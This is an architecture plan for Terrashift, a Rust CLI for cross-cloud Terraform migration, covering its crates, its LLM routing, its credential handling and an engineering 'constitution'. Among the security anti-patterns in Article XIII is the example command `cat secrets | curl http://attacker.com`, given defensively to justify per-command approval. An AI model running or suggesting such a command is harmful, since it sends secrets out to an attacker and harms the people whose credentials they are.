# Terrashift — Architecture Plan

**Cross-cloud Terraform migration, built as a single Rust binary.**

---

## 1. What this is

Terrashift is a CLI tool that migrates Terraform-managed infrastructure between cloud providers — GCP to AWS, AWS to Azure, and so on. It uses LLMs where they earn their place, deterministic code everywhere else, and ships as one statically-linked binary that drops on any machine and runs.

The tool exists because cross-cloud migration today costs $500K–$2M per project, takes 6–12 months, and routinely fails halfway through `terraform apply` because someone hallucinated an attribute. We can do better with a tool that knows the schemas, version-pins everything, runs idempotently, and keeps a signed audit log.

---

## 2. Goals

**Three things to get right:**

1. **Reproducible** — same migration today gives the same output six months from now. Version-pinned schemas. Audit log. Idempotency keys.
2. **Cheap to run** — 5–10× cheaper per migration than raw LLM use. Multi-tier caching. Tiered model routing. Deterministic-first execution.
3. **Safe** — no long-lived credentials, sandboxed apply, secret substitution, signed audit trail. The kind of safe that passes compliance review.

**Three things to deliberately avoid:**

- A general DevOps agent (that's Stakpak's territory)
- A chatbot that does migrations (chat is the wrong UX for production migrations)
- A solution that works only for greenfield Terraform (real estates have modules, dynamic blocks, and history)

---

## 3. Tech stack

**Rust everywhere it matters.**

Single language, single toolchain, single binary. No polyglot complexity, no runtime dependencies on the user's machine, no cross-process IPC.

### Core dependencies

| Component | Crate | Why |
|---|---|---|
| Async runtime | `tokio` | Standard. Stakpak uses it. |
| TUI rendering | `ratatui` | Stakpak uses it. Rich terminal UI. |
| HTTP client | `reqwest` (with `rustls-tls`) | Static linking, no OpenSSL dep. |
| LLM SDK | `stakai` | Provider-agnostic (OpenAI, Anthropic, Bedrock, Google). Apache 2.0. Built by Stakpak. |
| MCP client/server | `rmcp` | Rust MCP SDK with mTLS support. |
| HCL2 parsing | `hcl-rs` | Mature crate with serde support. |
| Vector store (RAG) | `lancedb` | Embedded, file-based, no separate service. |
| Database | `sqlx` (Postgres) or `rusqlite` | Compile-time checked queries. |
| Config | `toml` | Cargo-native, easy to read. |
| Serialization | `serde` + `serde_json` | Standard. |
| Logging | `tracing` + `tracing-subscriber` | Stakpak uses it. |
| Streaming | `reqwest-eventsource` | SSE for LLM streaming. |
| Errors | `thiserror` + `anyhow` | Standard pattern. |

That's the whole list. Everything else composes from these.

### Reference codebases

Two open-source projects plus one architectural reference document sit on every team member's local disk and serve as living references during development:

**Stakpak source code** (`refs/stakpak/`, github.com/stakpak/agent, Apache 2.0, Rust) — **primary architectural template.** Stakpak is an open-source DevOps agent that has solved most of the hard problems we'd otherwise face: secret substitution, MCP+mTLS, rulebook format, privacy-mode redaction, subagent permission model, reversible file operations, single-binary distribution, agent-loop in Rust. We pattern Terrashift's workspace structure, crate boundaries, and security model after theirs. Where Terrashift's logic differs (cross-cloud migration vs. general DevOps), we deviate deliberately and document why.

**`stakpak_arch.md`** (`refs/stakpak_arch.md`) — **canonical architectural reference document.** A ~2,840-line forensic analysis of Stakpak's architecture: every crate, every public trait, every state machine, every cross-cutting flow, with file:line citations throughout. Built from a deep file-by-file pass over Stakpak's `main` branch (480 files, ~177k LOC) plus a survey of all 295 remote branches. Contains an explicit "mirror playbook" (Part VIII) listing the seams to keep, the domain to replace, and a phased mirroring sequence with effort estimates. **This document is our canonical reference; we cite specific sections of it (e.g., `stakpak_arch.md section 8` for the agent loop kernel) rather than re-deriving patterns from source.**

**Claude Code source** (`refs/claude-code/`, github.com/MohamedGouda99/claude-cli-src, TypeScript) — **secondary reference for agent-loop concepts.** Claude Code's `Tool.ts`, conversation state machine, slash-command registry, and streaming protocol are elegantly designed. We translate the *concepts* into Rust; we don't fork the code.

**How we actually use them:** all three are accessible to Opus 4.7 via the `filesystem-readonly-refs` MCP server (see Opus setup doc). When generating code, we direct Opus to read the relevant section of `stakpak_arch.md` first, then descend into Stakpak source code only if the doc references a specific file:line and we need to verify. The architecture document is the canonical citation; the source code is the ground truth that backs it.

Apache 2.0 attribution is maintained in `ATTRIBUTIONS.md`.

### The 11 seams we mirror

`stakpak_arch.md section 39` lists 11 trait boundaries that allow swapping behaviour without rewriting the surrounding system. Mirroring difficulty is inversely proportional to depth: replacing the LLM provider is one trait impl; replacing the agent loop is rewriting the kernel. We adopt these seams in Terrashift:

| Layer | Seam | Effort to swap |
|---|---|---|
| LLM backend | `stakai::Provider` (4 methods) — implementations live in `libs/ai/src/providers/{name}/{convert,mod,provider,stream,types}.rs` | 1 trait impl + register with `ProviderRegistry::register()` |
| Tool execution | `agent_core::ToolExecutor::execute_tool_call` | 1 trait impl |
| Agent observation | `agent_core::AgentHook` (5 methods, all default no-op) | 1 trait impl per concern |
| Context overflow | `agent_core::CompactionEngine::compact` | 1 trait impl |
| Context reduction | `agent_core::ContextReducer::reduce` | 1 trait impl |
| Session storage | `stakpak_api::SessionStorage` (~10 methods) | 1 trait impl |
| Knowledge store | `stakpak_ak::StorageBackend` (~9 methods) | 1 trait impl |
| Channel platform | `stakpak_gateway::Channel` (5+3 methods) | 1 trait impl + register |
| MCP tool | `#[tool_router]` impl block | Add tool method, register router |
| TUI framework | mpsc channels (`InputEvent`/`OutputEvent`) | Replace `view()` + render fns |
| Input device | `map_crossterm_event_to_input_event` | Replace one fn + OS thread |

These seams are the basis of the prompts library (P-02 through P-21). Each prompt names a specific seam to implement and the `stakpak_arch.md` section that defines it.

---

## 4. Architecture

### High-level shape

A single Rust binary with internal modules. Conceptually, three layers:

```
┌─────────────────────────────────────────────┐
│  CLI / TUI   (Ratatui-based foreground)     │  ← user types here
├─────────────────────────────────────────────┤
│  Migration Engine  (the brain)              │
│   • Scanner    → reads source TF estate      │
│   • Mapper     → cross-cloud equivalences    │
│   • Planner    → migration order + DAG       │
│   • Generator  → emits target HCL            │
│   • Validator  → checks against live schemas │
│   • Executor   → sandboxed terraform apply   │
│   • Verifier   → post-apply integrity        │
│   • Recovery   → (agentic) handles failures  │
│   • Cost Opt.  → (agentic) cost analysis     │
├─────────────────────────────────────────────┤
│  Foundation                                  │
│   • Knowledge service (schemas, mappings)    │
│   • LLM client (stakai)                      │
│   • MCP layer (rmcp, mTLS)                   │
│   • Audit log + state store                  │
│   • Credential broker (no long-lived creds)  │
└─────────────────────────────────────────────┘
```

The **migration engine** is nine components. **Six are pure Rust** (Scanner, Generator, Validator, Executor, Verifier, plus the LLM-with-structured-output Mapper and Planner). **Three are agents** — components that loop through LLM calls because the path forward genuinely is unknown: Recovery, Cost Optimizer, and (in Stage 4) Cutover.

This split is the most important architectural decision in the system. It's covered in Article I of the constitution.

### Why this shape

A migration is mechanical translation 90% of the time. Agent-loops are wasteful when the answer is deterministic. The system uses LLMs as a *fallback* for the cases where the deterministic path doesn't have an answer — not as the *primary mode of operation*.

This is the opposite of how a chatbot like ChatGPT approaches the same problem. Chatbots use the LLM for everything. Terrashift uses Rust for everything it can, and an LLM only when it must.

---

## 5. The agentic-vs-deterministic split

Of nine pipeline components, only **three** are real agents:

| Component | Mode | Why |
|---|---|---|
| Scanner | Deterministic | Parsing HCL with `hcl-rs`. No LLM. |
| **Mapper** | LLM, structured output (1 call) | Maps `aws_*` ↔ `google_*` etc. Cached aggressively. |
| **Planner** | LLM, structured output (1 call) | Produces dependency DAG. Cached. |
| Generator | Deterministic + LLM-template | Emits HCL using cached templates; LLM fills gaps. |
| Validator | Deterministic | Live provider schema check. No LLM. |
| Executor | Deterministic | `terraform apply` in sandbox. No LLM. |
| Verifier | Deterministic | Post-apply state diff. No LLM. |
| **Recovery** | **Agent** | Failures need adaptation. LLM loop with tool access. |
| **Cost Optimizer** | **Agent** | Cost trade-offs benefit from reasoning. LLM loop. |

The Mapper and Planner are LLM-with-structured-output, **not agents** — they make exactly one LLM call producing JSON conforming to a Zod-like schema, then deterministic code takes over. They don't loop.

**Stage 1 ships with zero agents.** Recovery and Cost Optimizer arrive in Stage 2. This keeps Stage 1 simple and forces us to find out whether the deterministic pipeline actually works before adding complexity.

---

## 6. GenAI

### What we keep from the original GenAI architecture

All of it — the patterns are language-independent:

- **RAG over Terraform Registry mirror.** Schemas indexed locally in LanceDB. Version-pinned per migration.
- **Cross-cloud mapping corpus.** Curated equivalence table, embedded and searchable.
- **Tiered model routing.** Cheap model for grunt work, expensive only when needed.
- **Multi-tier caching.** L1 in-memory → L2 on-disk → L3 vector store → cold call.
- **Eval framework.** Golden migrations, scoring, regression gate.
- **Hallucination guardrails.** Every LLM-emitted attribute checked against live provider schema before HCL emit.

### How it's implemented in Rust

| Pattern | Rust implementation |
|---|---|
| LangChain-style prompt templates | Plain Rust structs + handlebars or `tera` for templating |
| RAG retrieval | `lancedb` for vectors, `reqwest` to embedding API, `serde` for chunks |
| Agent loops (Recovery, Cost Opt.) | `tokio` async functions with explicit state machines |
| Tool calls | `stakai`'s `Tool` type, dispatched through Terrashift's own `Tool` trait |
| Streaming responses | `reqwest-eventsource` |
| Provider routing | `stakai` already provides this |
| Prompt caching (Anthropic) | `stakai`'s `AnthropicCacheConfig` |
| Eval scoring | Pure Rust against golden datasets |

No LangChain, no LangGraph, no LiteLLM, no FastAPI. The patterns these libraries embody are reimplemented in Rust where they're 200–500 lines instead of frameworks.

### Token economy

Five mechanisms, each enforced by Constitution Article XII:

1. **Multi-tier cache** — L1 (in-memory, microseconds) → L2 (SQLite, milliseconds) → L3 (LanceDB, ~10ms) → cold LLM call.
2. **Tiered model routing** — every LLM-using component is bound to a *tier*, not a specific model. Three tiers: `eco` (Mapper, Planner — single-call structured output, cache-friendly), `smart` (Recovery, Cost Optimizer — bounded ReAct loops needing reasoning), `validator` (off — Validator is deterministic). The customer chooses the concrete model within each tier via configuration; the operator can pin tier-to-model mappings as policy fields if needed.
3. **Deterministic-first** — pure-code path attempted before any LLM call. LLM is fallback, not default.
4. **Context-window discipline** — prompts include only the resources being mapped, never the whole estate.
5. **CI regression gate** — token cost tracked per eval run against a baseline; >30% regression blocks PR. This replaces absolute per-migration ceilings: customers running BYOK choose their own cost/quality trade-off, but our eval framework guarantees the *system* doesn't silently get more expensive over time.

**Reference outcomes (eco-tier defaults, Stage 1 GCP→AWS demo):** $8–$30 per 200-resource migration with Haiku in `eco` and Sonnet in `smart`. Customers running `smart`-tier with Opus on every component will see 5–10× higher costs but get correspondingly better Recovery loops. The trade-off is theirs.

### Knowledge service

Mirrors the Terraform Registry into local storage:

- **Provider schemas** — fetched from `registry.terraform.io`, cached with version pins. Source of truth for "does this attribute exist in `aws v5.30`?"
- **Cross-cloud mapping corpus** — curated YAML/JSON files, version-controlled in `terrashift-mappings` repo, embedded into LanceDB at build time.
- **Migration error patterns** — every failed migration's error gets categorized, stored, and indexed. Future migrations retrieve similar patterns.

Query path: deterministic lookup first (exact resource type match) → vector similarity if no exact match → LLM fallback if vector search returns nothing useful.

### Model resolution and provider configuration

Mirroring Stakpak's pattern (`stakpak_arch.md` section 10 + section 15). Model selection is a runtime decision, not a build-time one — BYOK is first-class. Five layers of override, lowest priority to highest:

1. **Operator default** — `~/.terrashift/config.toml` `[profiles.default].model` (e.g. `"anthropic/claude-sonnet-4-5"`). Set by whoever installs Terrashift on the team's machines.
2. **Profile selection** — `terrashift --profile prod` picks a different named profile with its own model and provider config. Profiles are how a single workstation handles "Vodafone-prod" vs "personal-experiments" with different credentials and tier-mappings.
3. **CLI launch override** — `terrashift migrate --model openai/gpt-5` wins over operator default and profile for the entire session.
4. **In-conversation switch** — `/model` slash command in the TUI switches model from this turn onward. Late-binding: previous conversation history is preserved verbatim because `Vec<ChatMessage>` is provider-neutral; vendor-specific shape conversion happens fresh on every request inside `convert.rs`.
5. **Per-call override** — programmatic API callers (Stage 6+ SaaS use case) can pass `{ "overrides": { "model": "..." } }` for one request. Wins for that single call only.

The merge is implemented in `libs/server/src/routes.rs` via a `RunOverrides` struct. Priority within the merge: caller `overrides.model` > caller `body.model` > persisted `active_model` from last checkpoint metadata > `AppState.default_model` > `catalog[0]` (the safety net so a session never has no model).

**`provider_key/model_id` naming.** Models are written `provider/model` like `"anthropic/claude-opus-4-7"` or `"vodafone-internal/gpt-5"`. The `provider_key` half is the lookup into the user's `[profiles.X.providers.Y]` config block. Switching to a custom local model is just adding a config block; no code touch required.

```toml
# ~/.terrashift/config.toml
[profiles.default]
model = "anthropic/claude-haiku-4-5"

  [profiles.default.tiers]
  eco = "anthropic/claude-haiku-4-5"
  smart = "anthropic/claude-opus-4-7"

  [profiles.default.providers.anthropic]
  type = "anthropic"
  api_key_env = "ANTHROPIC_API_KEY"

  [profiles.default.providers.vodafone-internal]
  type = "openai-compatible"
  api_endpoint = "https://llm.internal.vodafone.com/v1"
  api_key_env = "VF_LLM_KEY"
```

**Preference vs policy split.** Following Stakpak's convention but enforcing it more strictly than they do. Customers can override *preference* fields (their own model choice, their own API keys, their own endpoint URLs, their own budget — downward only). Operators define *policy* fields and lock them at the profile level (Validator on the path, audit log on, max_turns cap, allowed providers list). Some fields are locked entirely with no override anywhere: the Article V redaction layer, Article XIII rule 5, audit signing keys.

**Provider catalog.** Stage 1 ships with stakai's stock providers (`anthropic`, `openai`, `gemini`, `bedrock`, `copilot`, `stakpak-gateway`). Adding a custom provider is one trait impl in `libs/ai/src/providers/{name}/` per Phase 3 of `stakpak_arch.md` section 41 — see prompt P-22 in `terrashift_prompts.md`. The `feat/add-minimax-provider` branch in the Stakpak repo is the canonical "how to add a provider" reference.

**Audit log records the model.** Per Article V, every `AuditEntry` for an LLM-touching operation includes `provider`, `model_id`, and `provider_endpoint` fields. Compliance reviewers can answer "which model produced this resource mapping at 14:32 on 2026-04-15?" deterministically.

The audit schema (full implementation in P-11) splits a base `AuditEntry` from a typed `AuditPayload` enum so each operation class records what it needs without bloating the base struct:

```rust
struct AuditEntry {
    id, timestamp, run_id, actor, operation, outcome,
    payload: AuditPayload,
    prev_hash, content_hash, signature: [u8; 64],  // Ed25519
}

enum AuditPayload {
    LlmCall { provider, model_id, provider_endpoint, tier,
              input_tokens, output_tokens, cache_read_tokens,
              cache_write_tokens, cost_usd_micros },
    ToolExecution { tool_name, cred_ref, target, duration_ms },
    PhaseTransition { from, to, checkpoint_id },
    CredentialResolution { cred_ref, resolution_method, expires_at },
    FileOperation { path, kind, backup_path },
}
```

`cred_ref` is always the `{{secret:name}}` reference, never the resolved value. The audit writer is the last line of defence for Article XIII rule 5: it runs the pre-prompt scrubber over every string field and panics loudly if any field contains a gitleaks-detected pattern.

---

## 7. Knowledge layer

Two databases:

**SQLite** (embedded, ships in binary's data dir) — schema cache, audit log, session state, idempotency keys. No separate service to run.

**LanceDB** (embedded, file-based) — vector store for RAG. Mapping corpus, error patterns, schema embeddings.

Both are file-based. Backup is `cp` of a directory. Restore is `cp` back. No DBA needed.

---

## 8. Auth and credentials

Three rules from Article V of the constitution:

1. **No long-lived credentials anywhere in Terrashift's process memory.** Credentials are fetched short-lived (STS for AWS, federated tokens for GCP/Azure) and dropped after the operation that needs them.
2. **The LLM never sees raw credentials.** Secret substitution: the LLM works with references like `{{secret:aws-prod-deploy}}`; resolution happens at the tool-execution boundary.
3. **All credential operations are audited.** Every fetch, use, and discard is logged with a timestamp and the operation that triggered it.

The credential broker is its own crate — `terrashift-creds` — with a small surface area and aggressive testing. Patterned directly after Stakpak's `libs/agent-core/secrets`.

---

## 9. Cost integration

Infracost is queried before any `terraform apply`. The Cost Optimizer agent (Stage 2) compares before/after and surfaces unexpected cost shifts. Output is in the audit log and shown to the user as a confirmation gate before apply.

---

## 10. Migration lifecycle

```
inventory → plan → generate → validate → preview → confirm → apply → verify → finalize
                                            ↓                    ↓
                                       (rollback)         (recovery agent)
```

Every transition is checkpointed. Killing Terrashift at any point and restarting resumes from the last good checkpoint. Idempotency keys ensure that re-applying produces identical output (or no-op if already applied).

---

## 11. Terraform completeness

Stage 1 supports: simple resources, basic modules, single-region.
Stage 4 adds: dynamic blocks, complex modules, multi-region, count/for_each.
Stage 5 adds: provider-specific edge cases (AWS Organizations, GCP Folders, Azure Management Groups).

Everything not yet supported produces a clean `not-yet-supported` error with a link to the issue tracker. We don't pretend to support things we don't.

---

## 12. State strategy

Source state file is read but never modified. Target state file is built fresh. After successful apply, the user is shown a diff and asked to confirm before the source state is archived (never deleted automatically — Article IX).

---

## 13. Observability

`tracing` everywhere. Spans for every LLM call, tool execution, and pipeline stage. Logs ship to OpenTelemetry-compatible backends if configured; otherwise to a local file. Stakpak's pattern.

---

## 14. Security

Article V applies in full. Plus:

- All MCP traffic uses mTLS by default (Stakpak's pattern).
- Privacy mode redacts AWS account IDs, ARNs, IPs, GCP project IDs, Azure subscription GUIDs from any LLM context.
- Sandboxed `terraform apply` runs in an isolated container with scoped IAM and a kill switch.
- Reversible file operations: every Generator output writes through a backup-first wrapper. Rollback is `cp -r .backup/`.

---

## 15. CLI design

Mirrors Stakpak's CLI shape:

```
terrashift                      # opens TUI
terrashift migrate <plan.tf>    # non-interactive
terrashift -c <checkpoint>      # resume
terrashift mcp start            # MCP server mode
terrashift rulebooks get        # rulebook management
terrashift account              # config / auth
```

Slash commands inside the TUI: `/help`, `/plan`, `/cost`, `/migrate`, `/rollback`, `/audit`, `/compact`, `/checkpoint`.

---

## 16. Repository structure

Six repos:

| Repo | Visibility | Contents |
|---|---|---|
| `terrashift` | Public | Main Rust workspace (CLI, libs, all production code) |
| `terrashift-mappings` | Public | Cross-cloud mapping corpus (YAML/JSON, curated) |
| `terrashift-rulebooks` | Public | SOPs, runbooks, migration playbooks (markdown + YAML frontmatter) |
| `terrashift-evals` | Private | Golden migrations, eval datasets |
| `terrashift-infra` | Private | Deployment infra, Terraform for our own services |
| `terrashift-docs` | Public | User docs, technical reference |

Main repo workspace structure mirrors Stakpak's:

```
terrashift/
├── cli/                    # binary entry, arg parsing, dispatch
├── tui/                    # Ratatui rendering
├── libs/
│   ├── shared/             # cross-cutting types
│   ├── agent-core/         # Tool trait, agent loop primitives
│   ├── ai/                 # LLM SDK wrapper around stakai
│   ├── knowledge/          # schema cache + RAG
│   ├── engine/             # the 9-component migration pipeline
│   ├── creds/              # credential broker
│   ├── mcp/{client,server,proxy,config}
│   ├── audit/              # signed audit log
│   └── eval/               # eval framework
├── Cargo.toml              # workspace
├── ATTRIBUTIONS.md         # Stakpak, Claude Code, all crate licenses
└── README.md
```

This structure is **directly patterned after Stakpak's**. Re-use of layout that has already proven to work.

---

## 17. Implementation stages

### Stage 1 — MVP (8–12 weeks part-time)

**Goal:** demonstrable GCP→AWS migration of a 10–15 resource sample, end-to-end. The funding demo.

**Includes:**
- Workspace scaffolding (Cargo, CI, releases)
- Scanner, Mapper (single LLM call), Planner (single LLM call)
- Generator (deterministic templates + LLM fill)
- Validator against live AWS provider schema
- Executor (sandboxed `terraform apply`)
- Verifier (post-apply state diff)
- Knowledge service (schema cache only; no RAG yet)
- Credential broker (basic STS for AWS, ADC for GCP)
- Audit log
- Eval framework with golden migrations
- Single-binary release (Linux x86_64, Mac arm64)

**Excludes:** Recovery agent, Cost Optimizer agent, Cutover, multi-cloud (only GCP→AWS), data migration, RAG corpus (just schema cache).

**Exit gate:** demo passes for a 15-resource sample. Audit log is signed. Re-running produces identical output. Token cost <$15 for the sample migration.

If the gate doesn't pass, we stop and rethink. We don't push through.

### Stage 2 — Agentic core (8 weeks)

Adds Recovery agent, Cost Optimizer agent, federation auth (cross-account STS, GCP Workload Identity, Azure managed identity).

### Stage 3 — Multi-cloud + RAG (8 weeks)

Adds Azure as third provider. Brings RAG online — full mapping corpus in LanceDB. Multi-LLM router with provider failover.

### Stage 4 — Data + cutover (10 weeks)

Adds DMS integration (AWS DMS, Cloud SQL DMS, Azure DMS). Cutover Agent with DNS plug-ins and health-check gates.

### Stage 5 — Structural fidelity (8 weeks)

Dynamic blocks, complex modules, count/for_each, provider-specific edge cases.

### Stage 6 — Hardening + SaaS (10 weeks)

Multi-tenancy, compliance certifications, GA release.

**Total to GA: ~14 months from Stage 1 start, assuming Stage 1 succeeds and post-funding stages run full-time.**

---

## 18. Risks

The honest list:

1. **Rust learning curve** for the team. Mitigation: Stakpak's source as a textbook + Opus 4.7 writing under directed prompts. The team reviews; the model types.
2. **`stakai` is young** (v0.3.x at time of writing). Mitigation: it's open-source, we can fork if needed; alternative is to build directly on `reqwest` + `serde_json`.
3. **`hcl-rs` doesn't cover 100% of HashiCorp's HCL2 spec.** Mitigation: contribute upstream where gaps appear; fall back to shelling out to `terraform fmt -check` for edge cases.
4. **Cross-cloud mapping is curation work, not engineering work.** Mitigation: the mapping corpus is its own repo with its own release cadence; we can iterate on it independently.
5. **Single-binary distribution has cross-platform CI complexity.** Mitigation: Stakpak has solved this; we copy their GitHub Actions workflows.
6. **Vodafone funding may not materialize.** Mitigation: Stage 1's MVP is independently demoable to other potential customers if Vodafone passes.

---

## 19. Constitution

The constitution is the source of truth for *how we build*. It's referenced in PR descriptions and reviewed at every stage gate. Twelve articles.

### Article I — Architectural restraint

Of the nine pipeline components, only three are agents (Recovery, Cost Optimizer, Cutover). The other six are deterministic or LLM-with-structured-output. Adding a new agent requires explicit RFC and stage-gate approval.

### Article II — Reference codebase discipline

Stakpak is the primary architectural reference. Claude Code is the secondary reference for agent-loop concepts. Both are checked out locally on every team member's machine. PR descriptions cite which patterns were adopted from where.

### Article III — AI safety

Every LLM-emitted attribute is checked against the live provider schema before HCL emit. Hallucinations are a build break, not a runtime warning.

### Article IV — Failure mode handling

Failures are loud. No silent fallbacks, no swallowed errors. Article IV.1: "If you can't tell the user what went wrong, don't continue."

### Article V — Credentials and security

No long-lived credentials in process memory. **Two credential classes** are protected: (a) cloud provider credentials (AWS STS, GCP ADC, Azure managed identity — short-lived federated tokens only, never long-lived keys), and (b) LLM provider keys (Anthropic, OpenAI, custom Vodafone gateway, etc. — `api_key_env` references resolved by the broker at runtime). The LLM never sees raw secrets of either class — only references resolved at the tool-execution boundary. Every credential operation is audited.

Audit entries for LLM-touching operations record `provider`, `model_id`, and `provider_endpoint` so compliance reviewers can answer "which model produced this artifact?" without ambiguity. Customer-supplied API keys never appear in any log, trace span, or error message — the redaction layer (Article XIII rule 5) catches them at the proxy boundary.

### Article VI — Knowledge layer integrity

Provider schemas are version-pinned per migration. The same migration today produces the same output six months from now. No "latest" anywhere.

### Article VII — Repository hygiene

Trunk-based development. No long-lived feature branches. PRs <500 lines preferred. Constitution articles cited in PR descriptions.

### Article VIII — Stage gates

Stages don't progress without exit-gate sign-off. Stage 1 ships before Stage 2 starts. No parallel stage development.

### Article IX — Data governance

State files, audit logs, and migration outputs are user property. We never delete user data automatically. Archival, never deletion.

### Article X — Observability

Every LLM call, every tool invocation, every pipeline stage gets a `tracing` span. Logs are structured. No `println!` in production code paths.

### Article XI — Amendments

The constitution is amended by RFC. Amendments are versioned. Major version bumps require team consensus.

### Article XII — Token economy

Five enforceable rules:

1. Every component has a documented per-tier cost ceiling against the eval baseline. The ceiling is per-tier (eco / smart) not per-migration; absolute per-migration costs depend on which model the customer chose within each tier (BYOK choice).
2. Cache-first: lookup → vector search → cold LLM call, in that order.
3. Tiered routing: every LLM-using component is bound to a tier (eco / smart), not a specific model. Concrete model is resolved at runtime per the 5-layer chain in section 6.
4. CI regression gate: >30% token cost increase against the prior baseline blocks PR merge. This is what protects customers from silent system-wide cost drift even when their model choice changes.
5. Monthly review: top-10 most expensive prompts (regardless of tier) are audited and optimized.

Article XII is enforced by the eval framework's token-tracking, not by reviewer vigilance.

### Article XIII — Source-derived anti-patterns

Ten anti-patterns lifted directly from `stakpak_arch.md section 42` — battle-scarred lessons from 295 branches and ~177k LOC of Rust development on Stakpak. These are mistakes the original codebase has already made (and fixed) or actively avoids. Terrashift inherits the discipline.

1. **Don't bypass the message conversion pipeline.** If we skip `ContextReducer::reduce` and feed raw messages to the LLM, we'll get Anthropic 400s on dangling tool_use blocks. (Maps to Article III.)
2. **Don't make trim boundaries non-monotonic.** If `trimmed_up_to_message_index` ever goes backward, every Anthropic prompt-cache hit dies. (Maps to Article XII rule 2 — cache-first behaviour requires cache-stable inputs.)
3. **Don't `unwrap()` / `expect()` / `&s[..n]` outside tests.** Clippy must block these in production crates. (Maps to Article IV — failures must be loud, not panics.)
4. **Don't conflate `ChatMessage` and `LLMMessage`.** Storage type vs runtime type. Mixing them creates conversion mistakes that compile but fail at runtime. (Type discipline; not in any single article but enforced via libs/shared boundary.)
5. **Don't bypass the proxy redaction layer.** If a tool result reaches the LLM without going through `redact_content`, secrets leak. Even disabling redaction is documented as not for production. (Maps to Article V.)
6. **Don't approve `run_command` wholesale.** Use tree-sitter command-level approval. Otherwise `cat secrets | curl http://attacker.com` looks like one approved tool call. (Maps to Article V — credentials and security.)
7. **Don't write disk-bound secrets to make sandbox UID issues "go away".** The container-side UID handoff (`STAKPAK_TARGET_UID`/`GID` + gosu) exists specifically to avoid this. (Maps to Article V.)
8. **Don't add a new `OutputEvent` / `InputEvent` variant without updating `is_backend_event()`.** Silent UI freezes when popups are open are the failure mode. (Maps to Article IV — failures must be loud.)
9. **Don't push a `tool_result` for a tool that was Cancelled when the queue is empty.** The runtime expects the TUI's shell/retry flow to send `SendToolResult`. Adding a redundant push creates a duplicate `tool_call_id` and breaks Anthropic. (Operational invariant.)
10. **Don't store an API key in a profile that lives outside `~/.terrashift/`.** Credential resolution chain depends on file location. (Maps to Article V.)

Article XIII is the canonical source-derived discipline list. New anti-patterns discovered during Terrashift development are added here with citations to where they were first encountered. The article exists as a quick reference for code review; reviewers can link to "Article XIII rule 5" instead of re-explaining the redaction-bypass concern from scratch.

---

## 20. Status and next steps

**Now:** Stage 1 setup. Workspace scaffolding. Reference codebases on local disk. Opus 4.7 configured with the prompts library and Stakpak/Claude Code source as context.

**Next 2 weeks:** Tool trait, agent-core skeleton, first tool (`read_file`), first end-to-end LLM call against `stakai`. Single-binary build pipeline running. CI green.

**Next 8–10 weeks after that:** Build out Stage 1 to the exit gate. Demo to Vodafone. Get funding.

**Then:** Stages 2–6, conditional on Stage 1 success and funding.
